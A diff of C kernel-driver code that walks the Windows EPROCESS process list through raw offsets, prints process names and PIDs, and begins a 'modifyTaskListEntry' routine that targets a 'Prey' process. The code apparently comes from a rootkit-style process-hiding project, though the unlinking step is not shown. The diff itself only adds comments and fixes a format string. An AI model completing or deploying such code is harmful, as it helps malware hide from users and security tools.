@@ -1,3 +1,4 @@
+//tested 7/28/2015, works!
 BYTE * getNextPEP(BYTE * currentPEP)
 {
 	BYTE * nextPEP = NULL;
@@ -9,7 +10,7 @@ BYTE * getNextPEP(BYTE * currentPEP)
 	nextPEP = (fLink - EPROCESS_OFFSET_LINKS);
 	return(nextPEP);
 }
-
+//tested 7/28/2015, works!
 BYTE * getPreviousPEP(BYTE* currentPEP)
 {
 	BYTE* prevPEP = NULL;
@@ -20,21 +21,21 @@ BYTE * getPreviousPEP(BYTE* currentPEP)
 	prevPEP = (bLink - EPROCESS_OFFSET_LINKS);
 	return(prevPEP);
 }
-
+//tested 7/28/2015, works!
 void getTaskName(char * dest, char *src)
 {
 	strncpy(dest, src, SZ_EPROCESS_NAME);
 	dest[SZ_EPROCESS_NAME - 1] = '\0';
 	return;
 }
-
+//tested 7/28/2015, works!
 int getPID(BYTE * currentPEP)
 {
 	int * pid;
 	pid = (int *)(currentPEP + EPROCESS_OFFSET_PID);
 	return(*pid);
 }
-
+//Tested 7/28/2015, works!
 void printNameInHex(BYTE * src)
 {
 	int i;
@@ -45,37 +46,40 @@ void printNameInHex(BYTE * src)
 	}
 	return;
 }
-
+//Tested on 07/28/2015, works
 void ListTasks()
 {
 	BYTE* currentPEP = NULL;
 	BYTE * nextPEP = NULL;
-
 	int currentPID = 0;
 	int startPID = 0;
 	BYTE name[SZ_EPROCESS_NAME];
+
 	//use the following variables to prevent infinite loops
 	int fuse = 0;
 	const int BLOWN = 1048576;
 	//get the current EPROCESS block
+	//get system
 	currentPEP = (BYTE *)PsGetCurrentProcess();
+	//get system PID
 	currentPID = getPID(currentPEP);
+	//get process name
 	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
 	DBG_PRINT1("ListTasks: Enumeration[Begin]\n");
 	startPID = currentPID;
-	DBG_PRINT3(" %5 [PID(%d)] :\n", name, currentPID);
-	//printNamelnHex(name);
+	DBG_PRINT3(" %s [PID(%d)] :\n", name, currentPID);
+	//printNameInHex(name);
 
 	//get the next EPROCESS block
 	nextPEP = getNextPEP(currentPEP);
 	currentPEP = nextPEP;
 	currentPID = getPID(currentPEP);
 	getTaskName(name, (currentPEP + EPROCESS_OFFSET_NAME));
-
+	//iterate through the rest of the EPROCESS blocks
 	while (startPID != currentPID)
 	{
-		DBG_PRINT3(" %5 [PID(%d)]:\n", name, currentPID);
-		//printNamelnHex(name);
+		DBG_PRINT3(" %s [PID(%d)]:\n", name, currentPID);
+		//printNameInHex(name);
 		nextPEP = getNextPEP(currentPEP);
 		currentPEP = nextPEP;
 		currentPID = getPID(currentPEP);
@@ -116,7 +120,7 @@ void modifyTaskListEntry(UCHAR * currentPEP)
 	prevPEP = getPreviousPEP(currentPEP);
 	prevPID = getPID(prevPEP);
 	getTaskName(prevName, (prevPEP + EPROCESS_OFFSET_NAME));
-	DBG_PRINT3("modifyTaskListEntry: Prey is %s[ PID=%d]\n", prevName, prevPID);
+	DBG_PRINT3("modifyTaskListEntry: Prey is %s[PID=%d]\n", prevName, prevPID);
 
 	nextPEP = getNextPEP(currentPEP);
 	nextPID = getPID(nextPEP);
